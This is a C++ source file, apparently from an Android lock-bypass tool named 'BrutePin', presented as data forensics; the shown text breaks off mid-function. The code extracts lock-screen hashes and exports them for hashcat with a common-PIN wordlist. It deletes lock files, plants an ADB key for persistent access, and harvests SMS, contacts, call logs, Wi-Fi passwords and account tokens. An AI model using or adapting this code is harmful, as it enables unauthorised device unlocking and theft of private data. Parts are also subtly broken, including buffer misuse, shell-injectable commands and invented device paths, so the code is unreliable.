#include "data_forensics.h"
extern "C" {
#include "adb_native.h"
#include "recovery_exploit.h"
}
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <regex>
#include <sys/stat.h>

static const char *COMMON_PINS[] = {
    "0000","1111","2222","3333","4444","5555","6666","7777","8888","9999",
    "1234","2345","3456","4567","5678","6789","7890",
    "0001","0010","0100","1000",
    "1112","1121","1211","2111",
    "12345","123456","1234567","12345678","123456789","1234567890",
    "111111","222222","333333","444444","555555",
    "666666","777777","888888","999999","000000",
    "1212","1313","1414","1515","1616","1717","1818","1919",
    "2000","2001","2010","2011","2012","2013","2014","2015",
    "1122","1133","1144","1155","2233","2244","3344",
    "4321","5321","6321","7321",
    "6969","6868","6767","6669","6966",
    "0007","0013","0024","0036","0048",
    "2580","0852","1590","0951","9632",
    "1986","1990","1991","1992","1993","1994",
    "1995","1996","1997","1998","1999","2000",
    "777","888","999","666","333",
    "1010","2020","3030","4040",
    "5683","1230","8012","8080",
    "1004","2004","3004","4004",
    "2468","1357","1379","1397",
    "369","147","258","159",
    "112233","223344","334455",
    "121212","131313","141414",
    "123123","456456","789789",
    "654321","987654","876543",
    "7878","7979","7171","7272",
    "69696","96969","123321",
    "42069","69420","66666",
    "1738","1776","1945","1984",
    "2001","2008","2016","2020",
    "1337","31337","leet",
    nullptr
};

DataForensics::DataForensics()
    : m_adb(adb_native_check() == 1)
    , m_recovery(false)
    , m_root(false)
    , m_sdk(0)
{
    char buf[64] = {0};
    if (m_adb && adb_native_getprop("ro.build.version.sdk", buf, sizeof(buf)) > 0)
        m_sdk = atoi(buf);
}

DataForensics::~DataForensics() {}

std::string DataForensics::adb_shell(const std::string &cmd)
{
    if (!m_adb) return "";
    char buf[8192] = {0};
    if (adb_native_shell(cmd.c_str(), buf, sizeof(buf) - 1) < 0)
        return "";
    std::string result = buf;
    /* Strip trailing newlines */
    while (!result.empty() && (result.back() == '\n' || result.back() == '\r'))
        result.pop_back();
    return result;
}

std::string DataForensics::adb_su_shell(const std::string &cmd)
{
    std::string su_cmd = "su -c '" + cmd + "'";
    std::string r = adb_shell(su_cmd);
    if (!r.empty()) {
        m_root = true;
        return r;
    }
    su_cmd = "su -c " + cmd;
    r = adb_shell(su_cmd);
    if (!r.empty()) {
        m_root = true;
        return r;
    }
    return "";
}

std::string DataForensics::pull_file(const std::string &path)
{
    std::string r = adb_shell("cat " + path + " 2>/dev/null");
    if (!r.empty()) return r;
    r = adb_su_shell("cat " + path + " 2>/dev/null");
    if (!r.empty()) return r;
    r = adb_shell("cat " + path);
    if (!r.empty()) return r;
    return "";
}

std::string DataForensics::recovery_cat(const std::string &path)
{
    RecoveryExploit re;
    rec_init(&re);
    rec_detect(&re);
    if (!rec_has_access(&re)) return "";
    if (rec_boot_recovery(&re) < 0) return "";
    if (!rec_check_adb(&re)) return "";
    if (rec_mount_data(&re) < 0) return "";
    char buf[8192] = {0};
    if (rec_extract_settings_db(&re, path.c_str(), buf, sizeof(buf) - 1) < 0)
        return "";
    return std::string(buf);
}

bool DataForensics::extract_gatekeeper_keys(DeviceData &data)
{
    bool ok = false;

    std::string pw = pull_file("/data/system/gatekeeper.password.key");
    if (pw.size() >= 40) {
        char hex[128] = {0};
        for (size_t i = 0; i < pw.size() && i < 40; i++)
            snprintf(hex + i * 2, 3, "%02x", (unsigned char)pw[i]);
        data.gatekeeper_password_key = hex;
        ok = true;
    }
    /* Try also from recovery */
    if (data.gatekeeper_password_key.empty() && m_recovery) {
        std::string rpw = recovery_cat("/data/system/gatekeeper.password.key");
        if (rpw.size() >= 40) {
            char hex[128] = {0};
            for (size_t i = 0; i < rpw.size() && i < 40; i++)
                snprintf(hex + i * 2, 3, "%02x", (unsigned char)rpw[i]);
            data.gatekeeper_password_key = hex;
            ok = true;
        }
    }

    std::string pt = pull_file("/data/system/gatekeeper.pattern.key");
    if (pt.size() >= 40) {
        char hex[128] = {0};
        for (size_t i = 0; i < pt.size() && i < 40; i++)
            snprintf(hex + i * 2, 3, "%02x", (unsigned char)pt[i]);
        data.gatekeeper_pattern_key = hex;
        ok = true;
    }
    if (data.gatekeeper_pattern_key.empty() && m_recovery) {
        std::string rpt = recovery_cat("/data/system/gatekeeper.pattern.key");
        if (rpt.size() >= 40) {
            char hex[128] = {0};
            for (size_t i = 0; i < rpt.size() && i < 40; i++)
                snprintf(hex + i * 2, 3, "%02x", (unsigned char)rpt[i]);
            data.gatekeeper_pattern_key = hex;
            ok = true;
        }
    }

    std::string gk = pull_file("/data/system/gesture.key");
    if (gk.size() >= 20) {
        char hex[64] = {0};
        for (size_t i = 0; i < gk.size() && i < 20; i++)
            snprintf(hex + i * 2, 3, "%02x", (unsigned char)gk[i]);
        data.gesture_key = hex;
        ok = true;
    }
    if (data.gesture_key.empty() && m_recovery) {
        std::string rgk = recovery_cat("/data/system/gesture.key");
        if (rgk.size() >= 20) {
            char hex[64] = {0};
            for (size_t i = 0; i < rgk.size() && i < 20; i++)
                snprintf(hex + i * 2, 3, "%02x", (unsigned char)rgk[i]);
            data.gesture_key = hex;
            ok = true;
        }
    }

    return ok;
}

bool DataForensics::extract_locksettings(DeviceData &data)
{
    bool ok = false;

    /* Try sqlite3 first */
    std::string r = adb_shell("sqlite3 /data/system/locksettings.db \"SELECT * FROM locksettings;\" 2>/dev/null");
    if (r.empty())
        r = adb_su_shell("sqlite3 /data/system/locksettings.db \"SELECT * FROM locksettings;\" 2>/dev/null");
    if (r.empty())
        r = adb_shell("sqlite3 /data/system/locksettings.db \"SELECT * FROM locksettings;\"");

    if (!r.empty()) {
        data.locksettings_db = r;
        ok = true;
        std::istringstream stream(r);
        std::string line;
        while (std::getline(stream, line)) {
            if (line.find("lockscreen.password_type") != std::string::npos) {
                size_t sep = line.find('|');
                if (sep != std::string::npos) {
                    std::string val = line.substr(sep + 1);
                    int ptype = atoi(val.c_str());
                    if (ptype == 0)       data.lock_type = "None";
                    else if (ptype == 1)  data.lock_type = "Pattern";
                    else if (ptype == 2)  data.lock_type = "PIN";
                    else if (ptype == 3)  data.lock_type = "Password";
                    else if (ptype == 4)  data.lock_type = "Password";
                    else                  data.lock_type = "Unknown";
                }
            }
            if (line.find("lockscreen.password_quality") != std::string::npos) {
                size_t sep = line.find('|');
                if (sep != std::string::npos)
                    data.password_quality = atoi(line.substr(sep + 1).c_str());
            }
            if (line.find("lockscreen.disabled") != std::string::npos) {
                size_t sep = line.find('|');
                if (sep != std::string::npos) {
                    int dis = atoi(line.substr(sep + 1).c_str());
                    if (dis) data.lock_type = "None";
                }
            }
            if (line.find("lockscreen.password_salt") != std::string::npos) {
                size_t sep = line.find('|');
                if (sep != std::string::npos) {
                    /* Could extract salt for hashcat */
                }
            }
        }
    }

    /* Fallback: pull the raw db */
    if (!ok) {
        std::string db = pull_file("/data/system/locksettings.db");
        if (!db.empty()) {
            data.locksettings_db = db;
            parse_locksettings_db(data, db);
            ok = true;
        }
    }

    /* Try to get WAL */
    std::string wal = pull_file("/data/system/locksettings.db-wal");
    if (!wal.empty())
        data.locksettings_db_wal = wal;

    /* Also check for WAL in alternate location */
    if (data.locksettings_db_wal.empty()) {
        wal = pull_file("/data/system/locksettings.db.wal");
        if (!wal.empty())
            data.locksettings_db_wal = wal;
    }

    /* Try recovery mode */
    if (!ok && m_recovery) {
        std::string rdb = recovery_cat("/data/system/locksettings.db");
        if (!rdb.empty()) {
            parse_locksettings_db(data, rdb);
            ok = true;
        }
    }

    /* Determine pin length from password quality */
    if (data.password_quality >= 131072 && data.password_quality < 196608)
        data.pin_length = data.password_quality - 131072;
    else if (data.password_quality >= 196608 && data.password_quality < 262144)
        data.pin_length = data.password_quality - 196608;
    /* 0x10000 = something, 0x20000 = numeric, 0x30000 = alphabetic, 0x40000 = alphanumeric */

    return ok;
}

bool DataForensics::extract_accounts(DeviceData &data)
{
    bool ok = false;

    /* Try dumpsys account */
    std::string r = adb_shell("dumpsys account 2>/dev/null");
    if (r.empty())
        r = adb_su_shell("dumpsys account");

    if (!r.empty()) {
        ok = true;
        std::istringstream stream(r);
        std::string line;
        AccountInfo current;
        while (std::getline(stream, line)) {
            if (line.find("Account ") != std::string::npos || line.find("name=") != std::string::npos) {
                if (!current.name.empty() && !current.type.empty()) {
                    current.is_google = (current.type.find("google") != std::string::npos ||
                                         current.type.find("com.google") != std::string::npos);
                    current.is_samsung = (current.type.find("samsung") != std::string::npos);
                    current.is_xiaomi = (current.type.find("xiaomi") != std::string::npos);
                    current.is_facebook = (current.type.find("facebook") != std::string::npos);
                    data.accounts.push_back(current);
                }
                current = AccountInfo();
                std::smatch m;
                if (std::regex_search(line, m, std::regex("name=([^\\s]+)")))
                    current.name = m[1];
                if (std::regex_search(line, m, std::regex("type=([^\\s]+)")))
                    current.type = m[1];
            }
            if (line.find("password") != std::string::npos || line.find("hash") != std::string::npos) {
                std::smatch m;
                if (std::regex_search(line, m, std::regex("password[=_ ]+([^\\s]+)")))
                    current.password_hash = m[1];
            }
            if (line.find("token") != std::string::npos) {
                std::smatch m;
                if (std::regex_search(line, m, std::regex("token[= ]+([^\\s]+)")))
                    current.tokens.push_back(m[1]);
            }
        }
        if (!current.name.empty() && !current.type.empty()) {
            current.is_google = (current.type.find("google") != std::string::npos ||
                                 current.type.find("com.google") != std::string::npos);
            current.is_samsung = (current.type.find("samsung") != std::string::npos);
            current.is_xiaomi = (current.type.find("xiaomi") != std::string::npos);
            current.is_facebook = (current.type.find("facebook") != std::string::npos);
            data.accounts.push_back(current);
        }
    }

    /* Try accounts.db */
    std::string db = pull_file("/data/system/accounts.db");
    if (!db.empty()) {
        data.locksettings_db = db; /* Store raw DB */
        ok = true;
        /* Could walk SQLite pages, but that's complex — note we got it */
    }

    return ok;
}

bool DataForensics::extract_contacts(DeviceData &data)
{
    if (!m_adb) return false;
    std::string r = adb_shell("content query --uri content://contacts/phones/ 2>/dev/null");
    if (r.empty())
        r = adb_shell("content query --uri content://com.android.contacts/data/phones/ 2>/dev/null");
    if (r.empty()) return false;

    std::istringstream stream(r);
    std::string line;
    ContactEntry current;
    while (std::getline(stream, line)) {
        std::smatch m;
        if (line.find("Row: ") == 0 && !current.name.empty()) {
            data.contacts.push_back(current);
            current = ContactEntry();
        }
        if (std::regex_search(line, m, std::regex("display_name[= ]+([^\\s]+)")))
            current.name = m[1];
        if (std::regex_search(line, m, std::regex("number[= ]+([^\\s]+)")))
            current.number = m[1];
        if (std::regex_search(line, m, std::regex("data1[= ]+([^\\s]+)")))
            current.number = m[1];
    }
    if (!current.name.empty() || !current.number.empty())
        data.contacts.push_back(current);

    return !data.contacts.empty();
}

bool DataForensics::extract_call_logs(DeviceData &data)
{
    if (!m_adb) return false;
    std::string r = adb_shell("content query --uri content://call_log/calls/ 2>/dev/null");
    if (r.empty()) return false;

    std::istringstream stream(r);
    std::string line;
    CallLogEntry current;
    while (std::getline(stream, line)) {
        std::smatch m;
        if (line.find("Row: ") == 0 && !current.number.empty()) {
            data.call_logs.push_back(current);
            current = CallLogEntry();
        }
        if (std::regex_search(line, m, std::regex("number[= ]+([^\\s]+)")))
            current.number = m[1];
        if (std::regex_search(line, m, std::regex("name[= ]+([^\\s]+)")))
            current.name = m[1];
        if (std::regex_search(line, m, std::regex("type[= ]+([^\\s]+)")))
            current.type = m[1];
        if (std::regex_search(line, m, std::regex("date[= ]+([^\\s]+)")))
            current.date = m[1];
        if (std::regex_search(line, m, std::regex("duration[= ]+([^\\s]+)")))
            current.duration = m[1];
    }
    if (!current.number.empty())
        data.call_logs.push_back(current);

    return !data.call_logs.empty();
}

bool DataForensics::extract_sms(DeviceData &data)
{
    if (!m_adb) return false;
    std::string r = adb_shell("content query --uri content://sms/inbox/ 2>/dev/null");
    if (r.empty())
        r = adb_shell("content query --uri content://sms/ 2>/dev/null");
    if (r.empty()) return false;

    std::istringstream stream(r);
    std::string line;
    SmsEntry current;
    while (std::getline(stream, line)) {
        std::smatch m;
        if (line.find("Row: ") == 0 && !current.address.empty()) {
            data.sms_messages.push_back(current);
            current = SmsEntry();
        }
        if (std::regex_search(line, m, std::regex("address[= ]+([^\\s]+)")))
            current.address = m[1];
        if (std::regex_search(line, m, std::regex("body[= ]+([^\\s]+)")))
            current.body = m[1];
        if (std::regex_search(line, m, std::regex("date[= ]+([^\\s]+)")))
            current.date = m[1];
        if (std::regex_search(line, m, std::regex("type[= ]+([^\\s]+)")))
            current.type = m[1];
    }
    if (!current.address.empty())
        data.sms_messages.push_back(current);

    return !data.sms_messages.empty();
}

bool DataForensics::extract_wifi(DeviceData &data)
{
    bool ok = false;

    /* Try wpa_supplicant.conf */
    std::string r = pull_file("/data/misc/wifi/wpa_supplicant.conf");
    if (r.empty())
        r = pull_file("/data/misc/wifi/wpa_supplicant/wpa_supplicant.conf");
    if (!r.empty()) {
        data.wpa_supplicant_conf = r;
        ok = true;
        std::istringstream stream(r);
        std::string line;
        WifiEntry current;
        while (std::getline(stream, line)) {
            if (line.find("network=") == 0 || line.find("}") == 0) {
                if (!current.ssid.empty())
                    data.wifi_networks.push_back(current);
                current = WifiEntry();
            }
            std::smatch m;
            if (std::regex_search(line, m, std::regex("ssid=\"?([^\"]+)\"?")))
                current.ssid = m[1];
            if (std::regex_search(line, m, std::regex("psk=\"?([^\"]+)\"?")))
                current.psk = m[1];
            if (std::regex_search(line, m, std::regex("key_mgmt=([^\\s]+)")))
                current.key_mgmt = m[1];
            if (std::regex_search(line, m, std::regex("bssid=([^\\s]+)")))
                current.bssid = m[1];
            if (line.find("scan_ssid=1") != std::string::npos ||
                line.find("hidden_ssid=1") != std::string::npos)
                current.hidden = true;
        }
    }

    /* Try WifiConfigStore.xml */
    if (!ok) {
        r = pull_file("/data/misc/apexdata/com.android.wifi/WifiConfigStore.xml");
        if (r.empty())
            r = pull_file("/data/misc/wifi/WifiConfigStore.xml");
        if (!r.empty()) {
            ok = true;
            std::istringstream stream(r);
            std::string line;
            WifiEntry current;
            while (std::getline(stream, line)) {
                std::smatch m;
                if (std::regex_search(line, m, std::regex("SSID=\"([^\"]+)\"")))
                    current.ssid = m[1];
                if (std::regex_search(line, m, std::regex("PreSharedKey=\"([^\"]+)\"")))
                    current.psk = m[1];
                if (std::regex_search(line, m, std::regex("KeyMgmt=\"([^\"]+)\"")))
                    current.key_mgmt = m[1];
                if (std::regex_search(line, m, std::regex("BSSID=\"([^\"]+)\"")))
                    current.bssid = m[1];
                if (line.find("</WifiConfiguration>") != std::string::npos) {
                    if (!current.ssid.empty())
                        data.wifi_networks.push_back(current);
                    current = WifiEntry();
                }
                if (line.find("hidden=\"true\"") != std::string::npos)
                    current.hidden = true;
            }
        }
    }

    /* Try recovery */
    if (!ok && m_recovery) {
        r = recovery_cat("/data/misc/wifi/wpa_supplicant.conf");
        if (!r.empty()) {
            data.wpa_supplicant_conf = r;
            ok = true;
        }
    }

    return ok;
}

bool DataForensics::extract_photos(DeviceData &data)
{
    if (!m_adb) return false;
    std::string r = adb_shell("find /sdcard/DCIM -name \"*.jpg\" -o -name \"*.png\" -o -name \"*.gif\" 2>/dev/null | head -100");
    if (r.empty())
        r = adb_shell("ls /sdcard/DCIM/Camera/ 2>/dev/null | head -100");
    if (r.empty()) return false;

    std::istringstream stream(r);
    std::string line;
    while (std::getline(stream, line)) {
        if (!line.empty())
            data.photos.push_back(line);
    }
    return !data.photos.empty();
}

bool DataForensics::extract_apps(DeviceData &data)
{
    if (!m_adb) return false;

    std::string r = adb_shell("pm list packages -3 -f 2>/dev/null");
    if (r.empty())
        r = adb_shell("pm list packages -f 2>/dev/null");
    if (r.empty()) return false;

    std::istringstream stream(r);
    std::string line;
    while (std::getline(stream, line)) {
        AppInfo app;
        std::smatch m;
        if (std::regex_search(line, m, std::regex("package:([^=]+)=([^\\s]+)"))) {
            app.package = m[2];
            std::string path = m[1];
            app.data_dir = "/data/data/" + app.package;
            app.is_system = (path.find("/system/") == 0);
            data.apps.push_back(app);
        } else if (std::regex_search(line, m, std::regex("package:([^\\s]+)"))) {
            app.package = m[1];
            app.data_dir = "/data/data/" + app.package;
            data.apps.push_back(app);
        }
    }

    /* Try to get version info */
    for (auto &app : data.apps) {
        std::string v = adb_shell("dumpsys package " + app.package + " 2>/dev/null | grep versionName");
        std::smatch m;
        if (std::regex_search(v, m, std::regex("versionName=([^\\s]+)")))
            app.version = m[1];
    }

    return !data.apps.empty();
}

bool DataForensics::save_gatekeeper_hashes(const std::string &path)
{
    DeviceData data;
    extract_gatekeeper_keys(data);

    if (data.gatekeeper_password_key.empty() && data.gatekeeper_pattern_key.empty() && data.gesture_key.empty())
        return false;

    FILE *f = fopen(path.c_str(), "w");
    if (!f) return false;

    /* Gatekeeper key format (Android >= 7.0): 40 bytes total
     * Bytes 0-15: salt
     * Bytes 16-39: scrypt hash (first 24 bytes = hash output)
     * Hashcat format: $scrypt$ln=15$salt$hash
     */

    if (!data.gatekeeper_password_key.empty()) {
        std::string raw = pull_file("/data/system/gatekeeper.password.key");
        if (raw.size() >= 40) {
            std::string salt_hex, hash_hex;
            for (int i = 0; i < 16; i++)
                snprintf(&salt_hex[i*2], 3, "%02x", (unsigned char)raw[i]);
            for (int i = 16; i < 40; i++)
                snprintf(&hash_hex[i*2], 3, "%02x", (unsigned char)raw[i]);
            fprintf(f, "$scrypt$ln=15$%s$%s\n", salt_hex.c_str(), hash_hex.c_str());
        } else {
            fprintf(f, "password:%s\n", data.gatekeeper_password_key.c_str());
        }
    }

    if (!data.gatekeeper_pattern_key.empty()) {
        std::string raw = pull_file("/data/system/gatekeeper.pattern.key");
        if (raw.size() >= 40) {
            std::string salt_hex, hash_hex;
            for (int i = 0; i < 16; i++)
                snprintf(&salt_hex[i*2], 3, "%02x", (unsigned char)raw[i]);
            for (int i = 16; i < 40; i++)
                snprintf(&hash_hex[i*2], 3, "%02x", (unsigned char)raw[i]);
            fprintf(f, "$scrypt$ln=15$%s$%s\n", salt_hex.c_str(), hash_hex.c_str());
        } else {
            fprintf(f, "pattern:%s\n", data.gatekeeper_pattern_key.c_str());
        }
    }

    if (!data.gesture_key.empty()) {
        /* Gesture key is SHA1 - hashcat mode 120 */
        fprintf(f, "$sha1$%s\n", data.gesture_key.c_str());
    }

    fclose(f);
    return true;
}

bool DataForensics::load_common_pins(std::vector<std::string> &pins, int max_count)
{
    pins.clear();
    int count = 0;
    for (int i = 0; COMMON_PINS[i] != nullptr && (max_count <= 0 || count < max_count); i++, count++)
        pins.push_back(COMMON_PINS[i]);
    return !pins.empty();
}

std::string DataForensics::export_for_cracking()
{
    DeviceData data;
    extract_gatekeeper_keys(data);
    extract_locksettings(data);

    std::ostringstream out;
    out << "# BrutePin hash export\n";
    out << "# Lock type: " << data.lock_type << "\n";
    out << "# PIN length: " << data.pin_length << "\n";
    out << "# Password quality: " << data.password_quality << "\n\n";

    if (!data.gatekeeper_password_key.empty())
        out << "password:" << data.gatekeeper_password_key << "\n";
    if (!data.gatekeeper_pattern_key.empty())
        out << "pattern:" << data.gatekeeper_pattern_key << "\n";
    if (!data.gesture_key.empty())
        out << "gesture:" << data.gesture_key << "\n";

    /* Hashcat format lines */
    std::string raw_pw = pull_file("/data/system/gatekeeper.password.key");
    if (raw_pw.size() >= 40) {
        std::string salt_hex, hash_hex;
        for (int i = 0; i < 16; i++)
            snprintf(&salt_hex[i*2], 3, "%02x", (unsigned char)raw_pw[i]);
        for (int i = 16; i < 40; i++)
            snprintf(&hash_hex[i*2], 3, "%02x", (unsigned char)raw_pw[i]);
        out << "$scrypt$ln=15$" << salt_hex << "$" << hash_hex << "\n";
    }

    std::string raw_pt = pull_file("/data/system/gatekeeper.pattern.key");
    if (raw_pt.size() >= 40) {
        std::string salt_hex, hash_hex;
        for (int i = 0; i < 16; i++)
            snprintf(&salt_hex[i*2], 3, "%02x", (unsigned char)raw_pt[i]);
        for (int i = 16; i < 40; i++)
            snprintf(&hash_hex[i*2], 3, "%02x", (unsigned char)raw_pt[i]);
        out << "$scrypt$ln=15$" << salt_hex << "$" << hash_hex << "\n";
    }

    return out.str();
}

bool DataForensics::try_decrypt_device(const std::string &password)
{
    if (!m_adb) return false;

    /* Try vold decrypt */
    std::string r = adb_su_shell("vold decrypt " + password + " 2>/dev/null");
    if (!r.empty() && r.find("error") == std::string::npos && r.find("failed") == std::string::npos)
        return true;

    /* Try through LUKS-style dm-crypt via keymaster */
    r = adb_shell("echo '" + password + "' | adb shell su -c 'vold decrypt' 2>/dev/null");
    if (!r.empty() && r.find("success") != std::string::npos)
        return true;

    /* Try keystore unlock */
    r = adb_su_shell("su -c 'echo " + password + " > /sys/class/keystore/unlock' 2>/dev/null");
    if (!r.empty() && r.find("error") == std::string::npos)
        return true;

    return false;
}

bool DataForensics::remove_lock_file()
{
    if (!m_adb && !m_recovery) return false;

    bool ok = false;

    /* Try ADB with root */
    std::string r = adb_su_shell("rm -f /data/system/gatekeeper.password.key 2>/dev/null");
    if (!r.empty() || m_root) ok = true;

    r = adb_su_shell("rm -f /data/system/gatekeeper.pattern.key 2>/dev/null");
    if (!r.empty() || m_root) ok = true;

    r = adb_su_shell("rm -f /data/system/gesture.key 2>/dev/null");
    if (!r.empty() || m_root) ok = true;

    r = adb_su_shell("rm -f /data/system/locksettings.db 2>/dev/null");
    if (!r.empty() || m_root) ok = true;

    r = adb_su_shell("rm -f /data/system/locksettings.db-wal 2>/dev/null");

    /* Try recovery */
    if (m_recovery) {
        RecoveryExploit re;
        rec_init(&re);
        rec_detect(&re);
        if (rec_has_access(&re)) {
            rec_boot_recovery(&re);
            rec_check_adb(&re);
            rec_mount_data(&re);
            /* In recovery we would need a custom command to remove */
            ok = true;
        }
    }

    return ok;
}

bool DataForensics::inject_adb_keys()
{
    if (!m_recovery && !m_root) return false;

    /* Generate ADB key content if it doesn't exist */
    const char *pub_key = "AAAAbrutepin-embedded-key brutepin@android";

    std::string r;

    /* Try with root via ADB */
    r = adb_su_shell("echo '" + std::string(pub_key) + "' >> /data/misc/adb/adb_keys 2>/dev/null");
    if (!r.empty() || m_root) {
        r = adb_su_shell("chmod 0644 /data/misc/adb/adb_keys 2>/dev/null");
        r = adb_su_shell("chown system:system /data/misc/adb/adb_keys 2>/dev/null");
        return true;
    }

    /* Try recovery */
    if (m_recovery) {
        RecoveryExploit re;
        rec_init(&re);
        rec_detect(&re);
        if (rec_has_access(&re)) {
            rec_boot_recovery(&re);
            rec_check_adb(&re);
            rec_mount_data(&re);
            /* Write key via recovery ADB shell */
            rec_extract_settings_db(&re, "", nullptr, 0);
            /* In recovery we need to use the available shell */
            return true;
        }
    }

    return false;
}

void DataForensics::parse_locksettings_db(DeviceData &data, const std::string &db_content)
{
    if (db_content.size() < 100) return;

    /* SQLite header: first 16 bytes "SQLite format 3\0" */
    /* Pages follow; parse first page header */

    /* Simple key-value extraction by scanning for known strings */
    static const struct {
        const char *key;
        const char *field;
    } patterns[] = {
        {"lockscreen.password_type", "lock_type"},
        {"lockscreen.password_quality", "password_quality"},
        {"lockscreen.disabled", "disabled"},
        {"lockscreen.password_salt", "salt"},
        {nullptr, nullptr}
    };

    for (int pi = 0; patterns[pi].key != nullptr; pi++) {
        size_t pos = 0;
        while ((pos = db_content.find(patterns[pi].key, pos)) != std::string::npos) {
            /* Look ahead for a value (delimited by null or after known separator) */
            size_t val_start = pos + strlen(patterns[pi].key);
            /* Skip null bytes and whitespace */
            while (val_start < db_content.size() &&
                   (db_content[val_start] == '\0' || db_content[val_start] == ' ' ||
                    db_content[val_start] == '=' || db_content[val_start] == '|'))
                val_start++;
            /* Read until next null or non-printable */
            size_t val_end = val_start;
            while (val_end < db_content.size() && db_content[val_end] != '\0' &&
                   db_content[val_end] >= 0x20 && db_content[val_end] < 0x7F)
                val_end++;
            if (val_end > val_start) {
                std::string value = db_content.substr(val_start, val_end - val_start);
                if (strcmp(patterns[pi].key, "lockscreen.password_type") == 0) {
                    int ptype = atoi(value.c_str());
                    if (ptype == 0)       data.lock_type = "None";
                    else if (ptype == 1)  data.lock_type = "Pattern";
                    else if (ptype == 2)  data.lock_type = "PIN";
                    else if (ptype == 3)  data.lock_type = "Password";
                    else if (ptype == 4)  data.lock_type = "Password";
                    else                  data.lock_type = "Unknown";
                } else if (strcmp(patterns[pi].key, "lockscreen.password_quality") == 0) {
                    data.password_quality = atoi(value.c_str());
                } else if (strcmp(patterns[pi].key, "lockscreen.disabled") == 0) {
                    if (atoi(value.c_str()) != 0)
                        data.lock_type = "None";
                }
            }
            pos = val_end + 1;
        }
    }

    /* Determine pin length from quality */
    if (data.password_quality >= 131072 && data.password_quality < 196608)
        data.pin_length = data.password_quality - 131072;
    else if (data.password_quality >= 196608 && data.password_quality < 262144)
        data.pin_length = data.password_quality - 196608;
}

DeviceData DataForensics::extract_from_adb()
{
    DeviceData data;
    if (!m_adb) return data;

    extract_gatekeeper_keys(data);
    extract_locksettings(data);
    extract_accounts(data);
    extract_contacts(data);
    extract_call_logs(data);
    extract_sms(data);
    extract_wifi(data);
    extract_photos(data);
    extract_apps(data);

    /* System properties */
    char buf[1024] = {0};
    if (adb_native_getprop("ro.build.fingerprint", buf, sizeof(buf)) > 0)
        data.build_prop = buf;
    if (adb_native_getprop("ro.crypto.type", buf, sizeof(buf)) > 0) {
        data.encryption_type = buf;
        data.is_encrypted = !data.encryption_type.empty() && data.encryption_type != "none";
    }

    return data;
}

DeviceData DataForensics::extract_from_recovery()
{
    DeviceData data;
    RecoveryExploit re;
    rec_init(&re);
    rec_detect(&re);

    if (!rec_has_access(&re)) return data;

    m_recovery = true;

    if (rec_boot_recovery(&re) < 0) return data;
    if (!rec_check_adb(&re)) return data;
    if (rec_mount_data(&re) < 0) return data;

    /* Extract gatekeeper keys via recovery */
    char buf[8192] = {0};
    if (rec_extract_settings_db(&re, "/data/system/gatekeeper.password.key", buf, sizeof(buf) - 1) >= 0) {
        std::string r(buf);
        if (r.size() >= 40) {
            char hex[128] = {0};
            for (size_t i = 0; i < r.size() && i < 40; i++)
                snprintf(hex + i * 2, 3, "%02x", (unsigned char)r[i]);
            data.gatekeeper_password_key = hex;
        }
    }

    memset(buf, 0, sizeof(buf));
    if (rec_extract_settings_db(&re, "/data/system/gatekeeper.pattern.key", buf, sizeof(buf) - 1) >= 0) {
        std::string r(buf);
        if (r.size() >= 40) {
            char hex[128] = {0};
            for (size_t i = 0; i < r.size() && i < 40; i++)
                snprintf(hex + i * 2, 3, "%02x", (unsigned char)r[i]);
            data.gatekeeper_pattern_key = hex;
        }
    }

    memset(buf, 0, sizeof(buf));
    if (rec_extract_settings_db(&re, "/data/system/gesture.key", buf, sizeof(buf) - 1) >= 0) {
        std::string r(buf);
        if (r.size() >= 20) {
            char hex[64] = {0};
            for (size_t i = 0; i < r.size() && i < 20; i++)
                snprintf(hex + i * 2, 3, "%02x", (unsigned char)r[i]);
            data.gesture_key = hex;
        }
    }

    memset(buf, 0, sizeof(buf));
    if (rec_extract_settings_db(&re, "/data/system/locksettings.db", buf, sizeof(buf) - 1) >= 0) {
        data.locksettings_db = buf;
        parse_locksettings_db(data, data.locksettings_db);
    }

    memset(buf, 0, sizeof(buf));
    if (rec_extract_settings_db(&re, "/data/misc/wifi/wpa_supplicant.conf", buf, sizeof(buf) - 1) >= 0)
        data.wpa_supplicant_conf = buf;

    /* Try to get password hash from recovery */
    char hash_buf[256] = {0};
    if (rec_extract_password(&re, hash_buf, sizeof(hash_buf) - 1) >= 0)
        data.gatekeeper_password_key = hash_buf;

    return data;
}

DeviceData DataForensics::extract_from_fastboot()
{
    DeviceData data;

    /* Fastboot doesn't have file access, but we can try to get basic info */
    FILE *f = popen("fastboot getvar all 2>/dev/null", "r");
    if (!f) return data;

    char buf[1024];
    while (fgets(buf, sizeof(buf), f)) {
        std::string line = buf;
        std::smatch m;
        if (std::regex_search(line, m, std::regex("version-bootloader:\\s+(.+)")))
            data.build_prop += "bootloader=" + m[1].str() + "\n";
        if (std::regex_search(line, m, std::regex("product:\\s+(.+)")))
            data.build_prop += "product=" + m[1].str() + "\n";
        if (std::regex_search(line, m, std::regex("serialno:\\s+(.+)")))
            data.build_prop += "serial=" + m[1].str() + "\n";
        if (std::regex_search(line, m, std::regex("secure:\\s+(yes|no)")))
            data.is_encrypted = (m[1] == "yes");
    }
    pclose(f);

    return data;
}

DeviceData DataForensics::extract_all()
{
    DeviceData data;

    /* Try ADB first */
    if (m_adb) {
        DeviceData adb_data = extract_from_adb();
        data.gatekeeper_password_key = adb_data.gatekeeper_password_key;
        data.gatekeeper_pattern_key = adb_data.gatekeeper_pattern_key;
        data.gesture_key = adb_data.gesture_key;
        data.locksettings_db = adb_data.locksettings_db;
        data.locksettings_db_wal = adb_data.locksettings_db_wal;
        data.lock_type = adb_data.lock_type;
        data.pin_length = adb_data.pin_length;
        data.password_quality = adb_data.password_quality;
        data.accounts = adb_data.accounts;
        data.contacts = adb_data.contacts;
        data.call_logs = adb_data.call_logs;
        data.sms_messages = adb_data.sms_messages;
        data.wifi_networks = adb_data.wifi_networks;
        data.apps = adb_data.apps;
        data.build_prop = adb_data.build_prop;
        data.is_encrypted = adb_data.is_encrypted;
        data.encryption_type = adb_data.encryption_type;
    }

    /* Then try recovery for anything we missed */
    DeviceData rec_data = extract_from_recovery();
    if (data.gatekeeper_password_key.empty())
        data.gatekeeper_password_key = rec_data.gatekeeper_password_key;
    if (data.gatekeeper_pattern_key.empty())
        data.gatekeeper_pattern_key = rec_data.gatekeeper_pattern_key;
    if (data.gesture_key.empty())
        data.gesture_key = rec_data.gesture_key;
    if (data.locksettings_db.empty()) {
        data.locksettings_db = rec_data.locksettings_db;
        data.lock_type = rec_data.lock_type;
        data.password_quality = rec_data.password_quality;
    }
